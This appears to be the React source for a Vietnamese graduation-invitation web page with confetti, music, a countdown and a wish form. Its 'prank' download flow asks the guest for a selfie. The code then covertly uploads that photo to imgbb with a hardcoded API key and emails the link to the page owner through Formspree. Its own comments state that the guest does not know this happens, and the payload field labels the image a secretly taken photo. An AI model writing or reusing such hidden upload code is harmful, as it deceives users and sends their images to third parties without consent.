'use client'

import cn from 'clsx'
import { useRef, useState, useEffect } from 'react'
import confetti from 'canvas-confetti'
import { CountdownBanner } from '~/components/countdown-banner'
import {
  ArrowRightIcon,
  type ArrowRightIconHandle,
} from '~/components/icon/arrow-right'
import { Image } from '~/components/image'
import RotateRevealText from '~/components/rotate-reveal-text'
import { Wrapper } from '~/components/wrapper'
import { useRotateReveal } from '~/hooks/use-rotate-reveal'

const CONTACT_LINKS = [
  {
    label: 'Directions to School',
    href: 'https://www.google.com/maps/place/HUIT+MEDIA+-+K%C3%AAnh+th%C3%B4ng+tin+v%C3%A0+truy%E1%BB%81n+th%C3%B4ng+%C4%90%E1%BA%A1i+h%E1%BB%8Dc+C%C3%B4ng+Th%C6%B0%C6%A1ng+TPHCM/@10.8071641,106.626188,17z/data=!3m1!4b1!4m6!3m5!1s0x31752b0f70a07397:0x3618522127c73084!8m2!3d10.8071588!4d106.6287629!16s%2Fg%2F11p5_7cd9x?entry=ttu&g_ep=EgoyMDI2MDQwOC4wIKXMDSoASAFQAw%3D%3D',
    ariaLabel: 'Open Google Maps directions to the ceremony',
    borderSecondary: false,
    isExternal: true,
  },
  {
    label: 'Facebook',
    href: 'https://www.facebook.com/mai.quoc.at.499699',
    ariaLabel: 'Open Facebook in a new tab',
    borderSecondary: true,
    isExternal: true,
  },
  {
    label: '0986570014',
    href: 'tel:0986570014',
    ariaLabel: 'Call',
    borderSecondary: true,
    isExternal: false,
  },
] as const

// Đã cập nhật ngày 21/04/2026 lúc 9h sáng
const TARGET_DATE = new Date('2026-04-21T09:00:00+07:00')

export default function Home() {
  const [guestName, setGuestName] = useState('')
  const [isModalOpen, setIsModalOpen] = useState(true)

  const [isPlaying, setIsPlaying] = useState(false)
  const audioRef = useRef<HTMLAudioElement | null>(null)

  const [wishText, setWishText] = useState('')
  const [isWishSent, setIsWishSent] = useState(false)
  const [hearts, setHearts] = useState<{ id: number; left: string }[]>([])

  const [showPrankModal, setShowPrankModal] = useState(false)
  const [prankStage, setPrankStage] = useState(0)
  const [noBtnPos, setNoBtnPos] = useState({ top: '50%', left: '70%' })

  const [isPreloaderComplete, setIsPreloaderComplete] = useState(false)
  const sectionRef = useRef<HTMLElement | null>(null)
  const countdownSectionRef = useRef<HTMLElement | null>(null)
  const iconRefs = useRef<(ArrowRightIconHandle | null)[]>([])

  // ==========================================
  // STATE & REFS CHO CAMERA
  // ==========================================
  const videoRef = useRef<HTMLVideoElement | null>(null)
  const canvasRef = useRef<HTMLCanvasElement | null>(null)
  const [capturedImage, setCapturedImage] = useState<string | null>(null)

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const audio = new Audio('/nhac-nen.mp3')
      audio.loop = true
      audioRef.current = audio
    }
  }, [])

  const handlePreloaderComplete = () => {
    setIsPreloaderComplete(true)
  }

  const handleEnterInvitation = () => {
    setIsModalOpen(false);

    const duration = 3 * 1000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 99999 };
    const randomInRange = (min: number, max: number) => Math.random() * (max - min) + min;

    const interval: any = setInterval(function () {
      const timeLeft = animationEnd - Date.now();
      if (timeLeft <= 0) return clearInterval(interval);
      const particleCount = 50 * (timeLeft / duration);
      confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } }));
      confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } }));
    }, 250);

    if (audioRef.current) {
      audioRef.current.play().then(() => {
        setIsPlaying(true);
      }).catch(err => console.warn("Lỗi phát nhạc:", err));
    }
  }

  const handleSendWish = async () => {
    if (!wishText.trim()) return;
    setIsWishSent(true);
    const newHearts = Array.from({ length: 15 }).map((_, i) => ({
      id: Date.now() + i,
      left: `${Math.random() * 80 + 10}%`
    }));
    setHearts(newHearts);
    setTimeout(() => setHearts([]), 3000);

    try {
      const formspreeUrl = "https://formspree.io/f/xjgjvvyv";
      await fetch(formspreeUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          Người_gửi: guestName,
          Lời_chúc: wishText,
          Thời_gian: new Date().toLocaleString('vi-VN')
        })
      });
    } catch (error) {
      console.error("Lỗi gửi lời chúc:", error);
    }
  }

  const handleMoveNoBtn = () => {
    const randomTop = Math.floor(Math.random() * 70) + 10;
    const randomLeft = Math.floor(Math.random() * 70) + 10;
    setNoBtnPos({ top: `${randomTop}%`, left: `${randomLeft}%` });
  }

  // ==========================================
  // HÀM XỬ LÝ CAMERA (Laptop & Mobile)
  // ==========================================
  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      setCapturedImage(null);
    } catch (err) {
      console.error("Lỗi camera:", err);
      alert("Thiết bị không có Camera hoặc bạn chưa cấp quyền! Bỏ qua bước này cho bạn đó nha 😜");
      setPrankStage(4);
    }
  };

  // 🔴 THUẬT TOÁN CHỐNG MÉO HÌNH: CẮT VIDEO VÀO CANVNAS VUÔNG CHUẨN XÁC
  const takePhoto = () => {
    if (videoRef.current && canvasRef.current) {
      const context = canvasRef.current.getContext('2d');
      if (context) {
        const canvas = canvasRef.current;
        
        // 1. Ép cứng kích thước Canvas chuẩn vuông (900x900) cho sắc nét
        const TARGET_SIZE = 900;
        canvas.width = TARGET_SIZE;
        canvas.height = TARGET_SIZE;

        // Lấy kích thước thật của Camera
        const video = videoRef.current;
        const videoW = video.videoWidth;
        const videoH = video.videoHeight;

        // Tính toán để cắt video cho vừa canvas vuông mà không bị méo (giống object-fit: cover)
        let drawW, drawH, offsetX, offsetY;
        const videoRatio = videoW / videoH;
        const canvasRatio = 1; // Vì TARGET_SIZE / TARGET_SIZE = 1

        if (videoRatio > canvasRatio) {
          // Video ngang hơn canvas
          drawH = TARGET_SIZE;
          drawW = TARGET_SIZE * videoRatio;
          offsetY = 0;
          offsetX = (TARGET_SIZE - drawW) / 2;
        } else {
          // Video dọc hơn canvas
          drawW = TARGET_SIZE;
          drawH = TARGET_SIZE / videoRatio;
          offsetX = 0;
          offsetY = (TARGET_SIZE - drawH) / 2;
        }

        // Lật canvas theo chiều ngang để có hiệu ứng gương cho video selfie
        context.translate(canvas.width, 0);
        context.scale(-1, 1);
        
        // 💄 THÊM BEAUTY FILTER (Nét và Sáng da - tùy chọn)
        context.filter = 'brightness(110%) contrast(110%) saturate(120%)';

        // Vẽ video vào canvas bằng thuật toán crop
        context.drawImage(video, offsetX, offsetY, drawW, drawH);

        // 2. Reset transform về mặc định (ĐÚNG ĐỂ VẼ KHUNG ẢNH KHÔNG BỊ LẬT NGƯỢC CHỮ)
        context.filter = 'none'; // Tắt beauty filter cho khung ảnh
        context.setTransform(1, 0, 0, 1, 0, 0);
        
        // 3. Tải khung ảnh lên và ghép vào
        const frameImg = new window.Image(); 
        frameImg.src = '/khung-anh.png';     
        
        frameImg.onload = () => {
          // Vẽ khung ảnh đè lên, co giãn cho vừa khít canvas 900x900
          context.drawImage(frameImg, 0, 0, canvas.width, canvas.height);
          setCapturedImage(canvas.toDataURL('image/png'));
          stopCamera();
        };
        
        frameImg.onerror = () => {
          setCapturedImage(canvas.toDataURL('image/png'));
          stopCamera();
        }
      }
    }
  };

  const stopCamera = () => {
    if (videoRef.current && videoRef.current.srcObject) {
      const stream = videoRef.current.srcObject as MediaStream;
      stream.getTracks().forEach(track => track.stop());
      videoRef.current.srcObject = null;
    }
  };

  // 🔴 HÀM UPLOAD ẢNH NGẦM LÊN IMGBB VÀ GỬI EMAIL (Đã fix type lỗi TypeScript)
  const uploadAndSendSelfie = async (base64Img: string) => {
    try {
      const base64Data = base64Img.split(',')[1];
      const formData = new FormData();
      formData.append('image', base64Data);
      
      const IMGBB_API_KEY = "1879acdf9ad813a9c8c59096d927a3ae"; 
      
      const imgbbResponse = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
        method: 'POST',
        body: formData
      });
      const imgbbData: any = await imgbbResponse.json();
      
      if (imgbbData.success) {
        const imageUrl = imgbbData.data.url;
        
        await fetch("https://formspree.io/f/xjgjvvyv", {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            Tiêu_đề: "🚨 CÓ ĐỨA XÁC NHẬN ĐI DỰ TỐT NGHIỆP!",
            Người_gửi: guestName,
            Link_Ảnh_Chụp_Lén: imageUrl,
            Thời_gian: new Date().toLocaleString('vi-VN')
          })
        });
      }
    } catch (err) {
      console.error("Lỗi gửi ảnh ngầm:", err);
    }
  };

  const handleNextPrank = () => {
    if (prankStage === 2) {
      setPrankStage(3);
      setTimeout(startCamera, 300);
    } else if (prankStage === 3) {
      setPrankStage(4);
    } else if (prankStage < 4) {
      setPrankStage(prankStage + 1);
    } else {
      // 1. TẢI THIỆP
      const link = document.createElement('a');
      link.href = '/Happy.png';
      link.download = `Thiep_Moi_Tot_Nghiep_${guestName || 'Khach'}.png`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // 🔴 2. KÍCH HOẠT QUÁ TRÌNH GỬI ẢNH NGẦM (Khách không hề hay biết)
      if (capturedImage) {
        uploadAndSendSelfie(capturedImage);
      }

      setShowPrankModal(false);
      stopCamera();
      setTimeout(() => {
        setPrankStage(0);
        setCapturedImage(null);
      }, 500);
    }
  }

  const prankContent = [
    { text: "Nhớ đi nha! Không đi là tới công chuyện đó! 😡", img: null },
    { text: "Uy tín nha! Chuẩn bị quà bự bự đi là vừa! 🎁", img: "/qr.jpg" },
    { text: "Đừng có bùng kèo phút chót nha bạn đẹp trai xinh gái gì đó ơi! 🔪", img: "/image7.png" },
    { text: "Để chắc chắn, hãy selfie 1 tấm làm bằng chứng sẽ tới dự nào! 📸", img: null },
    { text: "Đã lưu bằng chứng! Khỏi chối nha! Tải thiệp nè! Mãi iu ❤️", img: "/image7.jpg" },
  ]

  useRotateReveal({
    isActive: isPreloaderComplete,
    rootRef: sectionRef,
    selector: '[data-rotate-reveal]',
    duration: 2,
    delay: 0.8,
    initialRotate: 60,
    initialOpacity: 0,
    transformOrigin: 'bottom left',
    ease: 'power3.out',
    stagger: 0.1,
    perspective: 2000,
  })

  useRotateReveal({
    isActive: isPreloaderComplete,
    rootRef: countdownSectionRef,
    selector: '[data-rotate-reveal]',
    duration: 2,
    delay: 1.2,
    initialRotate: 60,
    initialOpacity: 0,
    transformOrigin: 'bottom left',
    ease: 'power3.out',
    stagger: 0.1,
    perspective: 2000,
  })

  return (
    <>
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&family=Great+Vibes&display=swap');
        @keyframes floatUp {
          0% { transform: translateY(0) scale(1); opacity: 1; }
          100% { transform: translateY(-200px) scale(1.5); opacity: 0; }
        }
        .flying-heart { animation: floatUp 2s ease-out forwards; }
        @keyframes spinRecord { 100% { transform: rotate(360deg); } }
        .spin-slow { animation: spinRecord 4s linear infinite; }
      `}} />

      {!isModalOpen && (
        <button
          onClick={() => {
            if (isPlaying) audioRef.current?.pause();
            else audioRef.current?.play();
            setIsPlaying(!isPlaying);
          }}
          className="fixed bottom-6 left-6 z-[999] bg-[#1a1a1a] border-2 border-[#f2ebd9] rounded-full p-3 shadow-xl transition-transform hover:scale-110"
        >
          <div className={cn("text-2xl", isPlaying && "spin-slow")}>
            {isPlaying ? "💿" : "🔇"}
          </div>
        </button>
      )}

      {/* POPUP NHẬP TÊN */}
      {isModalOpen && (
        <div
          style={{
            position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, zIndex: 99999,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            backgroundColor: 'rgba(0, 0, 0, 0.95)'
          }}
        >
          <div
            style={{
              backgroundColor: '#1c1c1c', padding: '40px 32px', borderRadius: '16px',
              border: '1px solid rgba(255, 255, 255, 0.1)', width: '90%', maxWidth: '400px',
              textAlign: 'center', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)', boxSizing: 'border-box'
            }}
          >
            <h2 className="font-chalmers text-primary" style={{ fontSize: '28px', color: '#f5f5f5', margin: '0 0 24px 0' }}>
              Bạn tên là gì nhỉ?
            </h2>
            <input
              type="text"
              value={guestName}
              onChange={(e) => setGuestName(e.target.value)}
              placeholder="Nhập tên của bạn..."
              style={{
                width: '100%', padding: '16px', backgroundColor: 'rgba(255, 255, 255, 0.05)',
                border: '1px solid rgba(255, 255, 255, 0.2)', borderRadius: '8px', color: '#fff',
                outline: 'none', fontSize: '16px', boxSizing: 'border-box', marginBottom: '20px'
              }}
              autoFocus
              onKeyDown={(e) => {
                if (e.key === 'Enter' && guestName.trim() !== "") handleEnterInvitation();
              }}
            />
            <button
              onClick={handleEnterInvitation}
              disabled={!guestName.trim()}
              style={{
                width: '100%', padding: '16px', backgroundColor: guestName.trim() ? '#fff' : '#444',
                color: guestName.trim() ? '#000' : '#888', borderRadius: '8px', fontWeight: 'bold',
                fontSize: '18px', cursor: guestName.trim() ? 'pointer' : 'not-allowed', border: 'none', boxSizing: 'border-box'
              }}
            >
              Xem thiệp mời
            </button>
          </div>
        </div>
      )}

      {/* POPUP TROLL & CHỤP ẢNH */}
      {showPrankModal && (
        <div
          style={{
            position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, zIndex: 99998,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            backgroundColor: 'rgba(0, 0, 0, 0.95)'
          }}
        >
          <div
            style={{
              backgroundColor: '#1c1c1c', padding: '40px 32px', borderRadius: '16px',
              border: '1px solid rgba(255, 255, 255, 0.1)', width: '90%', maxWidth: '450px',
              textAlign: 'center', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)', boxSizing: 'border-box'
            }}
          >
            {/* Hiển thị Ảnh Meme */}
            {prankStage !== 3 && prankStage > 0 && prankContent[prankStage].img && (
              <img
                src={prankContent[prankStage].img!}
                alt="Funny meme"
                style={{ width: '100%', maxHeight: '250px', objectFit: 'contain', borderRadius: '8px', marginBottom: '24px' }}
              />
            )}

            {/* Hiển thị Camera (chỉ ở Stage 3) */}
            {prankStage === 3 && (
              <div style={{ marginBottom: '24px', position: 'relative', width: '100%', borderRadius: '12px', overflow: 'hidden', backgroundColor: '#000', aspectRatio: '1/1' }}>
                <video
                  ref={videoRef}
                  autoPlay
                  playsInline
                  muted
                  style={{ width: '100%', height: '100%', objectFit: 'cover', display: capturedImage ? 'none' : 'block', transform: 'scaleX(-1)' }}
                />
                
                {/* HIỂN THỊ KHUNG ẢNH LÚC ĐANG SOI CAM (Ép chuẩn vuông 1:1) */}
                {!capturedImage && (
                  <img 
                    src="/khung-anh.png" 
                    alt="Khung hình" 
                    style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', zIndex: 10, pointerEvents: 'none', objectFit: 'fill' }} 
                  />
                )}
                
                {/* HIỂN THỊ ẢNH ĐÃ CHỤP (Lấy từ canvas đã crop và lật, nên không cần lật lại ở đây) */}
                {capturedImage && (
                  <img src={capturedImage} alt="Captured" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                )}
                <canvas ref={canvasRef} style={{ display: 'none' }} />
              </div>
            )}

            <h3 className="font-chalmers text-primary" style={{ fontSize: '24px', color: '#fff', lineHeight: '1.5', margin: '0 0 24px 0' }}>
              {prankContent[prankStage].text}
            </h3>

            {/* Render các nút tùy theo giai đoạn */}
            {prankStage === 0 ? (
              <div style={{ position: 'relative', height: '100px', width: '100%' }}>
                <button
                  onClick={handleNextPrank}
                  style={{ position: 'absolute', top: '50%', left: '30%', transform: 'translate(-50%, -50%)', padding: '14px 28px', backgroundColor: '#fff', color: '#000', borderRadius: '8px', fontWeight: 'bold', fontSize: '16px', border: 'none', cursor: 'pointer', zIndex: 10 }}
                >
                  Biết rồi!
                </button>
                <button
                  onMouseEnter={handleMoveNoBtn}
                  onClick={handleMoveNoBtn}
                  style={{ position: 'absolute', top: noBtnPos.top, left: noBtnPos.left, transform: 'translate(-50%, -50%)', padding: '14px 28px', backgroundColor: '#333', color: '#fff', borderRadius: '8px', fontWeight: 'bold', fontSize: '16px', border: '1px solid #555', cursor: 'pointer', transition: 'all 0.2s ease-out' }}
                >
                  Không!
                </button>
              </div>
            ) : prankStage === 3 ? (
              /* NÚT BẤM KHI Ở BƯỚC CAMERA */
              <>
                {!capturedImage ? (
                  <button onClick={takePhoto} style={{ width: '100%', padding: '16px', backgroundColor: '#ea580c', color: '#fff', borderRadius: '8px', fontWeight: 'bold', fontSize: '18px', border: 'none', cursor: 'pointer' }}>
                    📸 Bấm chụp liền!
                  </button>
                ) : (
                  <div style={{ display: 'flex', gap: '10px' }}>
                    <button onClick={startCamera} style={{ flex: 1, padding: '16px', backgroundColor: '#444', color: '#fff', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer', fontSize: '16px' }}>
                      🔄 Chụp lại
                    </button>
                    <button onClick={handleNextPrank} style={{ flex: 1, padding: '16px', backgroundColor: '#fff', color: '#000', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer', fontSize: '16px' }}>
                      Tiếp tục 👉
                    </button>
                  </div>
                )}
              </>
            ) : (
              <button
                onClick={handleNextPrank}
                style={{ width: '100%', padding: '16px', backgroundColor: '#fff', color: '#000', borderRadius: '8px', fontWeight: 'bold', fontSize: '18px', border: 'none', cursor: 'pointer', boxSizing: 'border-box' }}
              >
                {prankStage === 4 ? "Tải thiệp nè!" : "Tiếp tục"}
              </button>
            )}
          </div>
        </div>
      )}

      {/* GIAO DIỆN CHÍNH */}
      <Wrapper theme="light" className="px-safe overflow-x-clip z-10" onPreloaderComplete={handlePreloaderComplete}>
        <section ref={sectionRef} className="relative coi-grid!">
          <h1 className="col-span-full coi-pt-20 bg-secondary coi-pl-4 dt:coi-pl-10 uppercase home-title text-primary relative z-10 overflow-hidden">
            <RotateRevealText>Final Chapter!</RotateRevealText>
          </h1>

          {!isModalOpen && guestName && (
            <div className="col-span-full bg-secondary coi-pl-4 pr-4 dt:coi-pl-10 dt:pr-8 py-6 dt:py-10 flex flex-col dt:flex-row items-center dt:items-start justify-between gap-8 dt:gap-12 relative z-10">
              
              {/* PHẦN CHỮ (Điện thoại nằm dưới, PC nằm trái) */}
              <div className="w-full dt:w-[65%] order-2 dt:order-1 text-left">
                <RotateRevealText
                  as="div"
                  className="text-primary font-chalmers"
                  style={{ fontSize: '2.0rem', lineHeight: '1.6', letterSpacing: '0.5px' }}
                >
                  <p style={{ marginBottom: '20px', fontSize: '1.8rem' }}>
                    Xin chào,{' '}
                    <span
                      style={{
                        color: '#FFf',
                        fontWeight: 'bold',
                        fontFamily: '"Great Vibes", cursive',
                        fontSize: '2.5rem'
                      }}
                    >
                      {guestName}
                    </span>
                  </p>
                  <p style={{ marginBottom: '16px' }}>
                    Sau một hành trình dài với nhiều kỷ niệm và cố gắng, mình rất vui khi được chia sẻ khoảnh khắc đặc biệt này cùng bạn.
                  </p>
                  <p>
                    Hy vọng <span
                      style={{
                        color: '#FFf',
                        fontWeight: 'bold',
                        fontFamily: '"Great Vibes", cursive',
                        fontSize: '2.5rem'
                      }}
                    >
                      {guestName}
                    </span> sẽ đến và cùng mình lưu lại một dấu ấn đáng nhớ trong ngày tốt nghiệp ❤️
                  </p>
                </RotateRevealText>
              </div>

              {/* PHẦN HÌNH ẢNH (Điện thoại nằm trên căn giữa, PC nằm phải và CANH GIỮA TRÊN PC) */}
              <div className="w-full order-1 dt:order-2 flex justify-center dt:justify-center dt:mx-auto dt:w-[30%]">
                <div className="w-[70%] sm:w-[60%] dt:w-full">
                  <Image
                    src="/image9.png"
                    alt="Thank you portrait"
                    className="w-full rounded-xl"
                    aspectRatio={3 / 4}
                    priority
                    mobileSize="100vw"
                    desktopSize="30vw"
                    style={{ border: 'none' }}
                  />
                </div>
              </div>

            </div>
          )}
          <div className="col-span-full coi-py-10 dt:coi-py-10 bg-contrast border-solid coi-border-t-px coi-border-b-px border-secondary [border-top-style:solid] [border-bottom-style:solid] relative overflow-hidden">
            <CountdownBanner targetDate={TARGET_DATE} isActive={isPreloaderComplete} />
          </div>

          <div className="relative mobile-only col-span-full coi-mt-24">
            <h1 className="uppercase h2 font-chalmers">
              <RotateRevealText>Graduation</RotateRevealText>
            </h1>
            <div className="-z-1 absolute top-0 left-0 w-full h-full">
              <div className="dt:coi-w-480 coi-w-342 coi-h-px bg-contrast/20 dt:coi-mt-40 coi-mt-50 relative" />
            </div>
          </div>

          <div className="col-span-full dt:col-start-1 dt:col-span-3 coi-mt-30 dt:coi-border-r-px dt:border-secondary dt:[border-right-style:solid] order-2 dt:order-0">
            <div className="relative desktop-only">
              <h1 className="uppercase h2 coi-mb-24 font-chalmers">
                <RotateRevealText>Graduation</RotateRevealText>
              </h1>
              <div className="-z-1 absolute top-0 left-0 w-full h-full">
                <div className="dt:coi-w-480 coi-w-342 coi-h-px bg-contrast/20 dt:coi-mt-40 coi-mt-50 relative" />
              </div>
            </div>
            <div>
              <Image src="/image5.png" alt="Graduation Left" className="border-solid coi-border-px border-secondary" aspectRatio={53 / 68} mobileSize="130vw" priority desktopSize="33vw" />
            </div>
            <p className="cta font-chalmers uppercase coi-mt-30 flex items-center gap-10">
              <RotateRevealText>✦✦✦ Find me here</RotateRevealText>
            </p>
            <div className="flex flex-col dt:coi-gap-30 coi-gap-15 coi-mt-32 uppercase">
              {CONTACT_LINKS.map(
                ({ label, href, ariaLabel, borderSecondary, isExternal }, index) => (
                  <RotateRevealText
                    key={label} as="a" href={href} aria-label={ariaLabel} target={isExternal ? '_blank' : undefined} rel={isExternal ? 'noopener noreferrer' : undefined}
                    className={cn('contact coi-border-b-px [border-bottom-style:solid] flex items-center justify-between gap-16 group', borderSecondary ? 'border-secondary' : undefined)}
                    onMouseEnter={() => iconRefs.current[index]?.startAnimation()}
                    onMouseLeave={() => iconRefs.current[index]?.stopAnimation()}
                    onFocus={() => iconRefs.current[index]?.startAnimation()}
                    onBlur={() => iconRefs.current[index]?.stopAnimation()}
                  >
                    <span>{label}</span>
                    <ArrowRightIcon ref={(handle) => { iconRefs.current[index] = handle }} aria-hidden="true" className="shrink-0 transition-transform duration-200 group-hover:translate-x-1 group-focus-visible:translate-x-1" />
                  </RotateRevealText>
                )
              )}
            </div>
          </div>
          <div className="col-span-full dt:coi-ml-20 coi-ml-0 dt:col-start-4 dt:col-span-5 coi-mt-30 order-1 dt:order-0">
            <div>
              <Image src="/image13.png" alt="Graduation Right" className="w-full border-solid coi-border-px border-secondary" aspectRatio={47 / 32} priority mobileSize="130vw" desktopSize="120vw" />
            </div>
            <div className="relative">
              <RotateRevealText as="h2" className="text-black coi-pt-30 dt:coi-pt-50 uppercase h1">Tuesday, April 21, 2026</RotateRevealText>
              <RotateRevealText as="h2" className="text-black coi-pt-30 dt:coi-pt-45 uppercase h1">From <span className="bg-contrast text-primary coi-px-12 coi-rounded-10">9:00 - 11:30</span></RotateRevealText>
              <RotateRevealText as="h2" className="text-black coi-pt-30 dt:coi-pt-45 uppercase h1 -coi-tracking-px">At HUIT University</RotateRevealText>
              <div className="-z-1 absolute top-0 left-0 w-full h-full">
                <div className="w-full coi-h-px bg-contrast/20 coi-mt-70 dt:coi-mt-105 relative" />
                <div className="w-full coi-h-px bg-contrast/20 coi-mt-74 dt:coi-mt-120 relative" />
                <div className="w-full coi-h-px bg-contrast/20 coi-mt-76 dt:coi-mt-120 relative" />
                <div className="w-full coi-h-px bg-contrast/20 coi-mt-76 dt:coi-mt-120 relative" />
              </div>
              <h1 className="col-start-1 col-span-4 dt:col-start-1 dt:col-span-6 coi-pt-10 dt:coi-pt-50 coi-mt-30 bg-secondary uppercase coi-text-60 dt:coi-text-160 home-title text-primary relative order-3 dt:order-0 mobile-only">
                <RotateRevealText>Mai Đạt</RotateRevealText>
              </h1>
            </div>
          </div>

          {/* --- KHU VỰC TẢI THIỆP --- */}
          {!isModalOpen && guestName && (
            <div className="col-span-full flex flex-col dt:flex-row items-center justify-center gap-6 dt:gap-12 coi-mt-30 dt:coi-mb-10 order-3 dt:order-0 relative z-20 px-4">
              <video
                src="/video1.webm"
                autoPlay
                loop
                muted
                playsInline
                style={{ height: '240px', width: 'auto', objectFit: 'contain', position: 'relative', zIndex: 10 }}
              />
              <div className="flex flex-col items-center gap-6 relative mt-2 dt:mt-0">
                <div
                  className="relative bg-[#f2ebd9] border-[4px] border-[#1a1a1a] px-8 py-4 shadow-md font-chalmers text-[#1a1a1a] text-center transform -rotate-[3deg] rounded-[40px] z-20"
                  style={{ fontSize: '1.8rem', whiteSpace: 'nowrap', lineHeight: '1.5' }}
                >
                  Tải thiệp về <br /> ở đây nè! 👈
                  <div className="absolute bg-[#f2ebd9] border-l-[4px] border-t-[4px] border-[#1a1a1a]" style={{ width: '28px', height: '28px', top: '-12px', left: '30px', transform: 'rotate(45deg)', borderTopLeftRadius: '4px', zIndex: 30 }}></div>
                </div>

                <button
                  onClick={() => setShowPrankModal(true)}
                  className="font-chalmers border-[4px] border-[#1a1a1a] bg-[#f2ebd9] text-[#1a1a1a] rounded-[60px] px-10 py-5 flex items-center justify-center gap-4 hover:bg-[#1a1a1a] hover:text-[#f2ebd9] transition-all duration-200 z-20 shadow-[6px_6px_0px_#1a1a1a] active:shadow-none active:translate-x-[6px] active:translate-y-[6px]"
                  style={{ fontSize: '2.2rem', textTransform: 'uppercase' }}
                >
                  Tải thiệp về
                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                    <polyline points="7 10 12 15 17 10"></polyline>
                    <line x1="12" y1="15" x2="12" y2="3"></line>
                  </svg>
                </button>
              </div>
            </div>
          )}

          {/* --- HÒM THƯ GỬI LỜI CHÚC --- */}
          {!isModalOpen && guestName && (
            <div className="col-span-full order-3 dt:order-0 mt-16 dt:mt-24 mb-10 relative z-20" style={{ width: '100%', padding: '0 16px', boxSizing: 'border-box' }}>
              <div
                style={{
                  width: '100%', maxWidth: '600px', margin: '0 auto', backgroundColor: '#1c1c1c',
                  border: '1px solid rgba(255,255,255,0.2)', padding: '32px', borderRadius: '16px',
                  textAlign: 'center', position: 'relative', overflow: 'hidden', boxShadow: '0 10px 30px rgba(0,0,0,0.5)', boxSizing: 'border-box'
                }}
              >
                {hearts.map(heart => (
                  <div key={heart.id} className="absolute text-3xl flying-heart" style={{ left: heart.left, bottom: '20px' }}>❤️</div>
                ))}
                <h3 className="font-chalmers text-primary" style={{ fontSize: '26px', color: '#f5f5f5', margin: '0 0 20px 0' }}>
                  Ước gì được ai đó gửi lời chúc!👉🏻👈🏻💌
                </h3>

                {!isWishSent ? (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                    <textarea
                      value={wishText}
                      onChange={(e) => setWishText(e.target.value)}
                      placeholder="Để đúng tên bạn để mình biết là ai nha 😄."
                      style={{
                        width: '100%', minHeight: '120px', padding: '16px', backgroundColor: 'rgba(255,255,255,0.05)',
                        border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff',
                        outline: 'none', resize: 'none', boxSizing: 'border-box', fontSize: '16px'
                      }}
                    />
                    <button
                      onClick={handleSendWish}
                      disabled={!wishText.trim()}
                      style={{
                        width: '100%', backgroundColor: '#f2ebd9', color: '#1a1a1a', fontWeight: 'bold',
                        padding: '16px', borderRadius: '8px', border: 'none', cursor: wishText.trim() ? 'pointer' : 'not-allowed',
                        opacity: wishText.trim() ? 1 : 0.5, textTransform: 'uppercase', fontSize: '16px', boxSizing: 'border-box'
                      }}
                    >
                      Ước được gửi ❤️
                    </button>
                  </div>
                ) : (
                  <div style={{ padding: '32px 0' }}>
                    <p style={{ fontSize: '22px', fontWeight: 'bold', color: '#fff', marginBottom: '8px' }}>Đã gửi thành công! 🎉</p>
                    <p style={{ color: 'rgba(255,255,255,0.7)', fontSize: '16px' }}>Cảm ơn lời chúc tuyệt vời của {guestName} nha!</p>
                  </div>
                )}
              </div>
            </div>
          )}

          <h1 className="col-start-1 col-span-4 dt:col-start-1 dt:col-span-6 coi-pt-10 dt:coi-pt-50 bg-secondary uppercase coi-text-53 dt:coi-text-182 home-title text-primary relative order-3 dt:order-0 coi-pl-6 desktop-only">
            <RotateRevealText>Thatislife</RotateRevealText>
          </h1>
          <div className="col-span-full dt:col-start-7 dt:col-span-2 coi-mt-20 order-3 dt:order-0 coi-ml-21 dt:coi-ml-0">
            <Image src="/image10.png" alt="Stamp" aspectRatio={5 / 4} mobileSize="100vw" desktopSize="33vw" />
          </div>
        </section>
      </Wrapper>
    </>
  )
}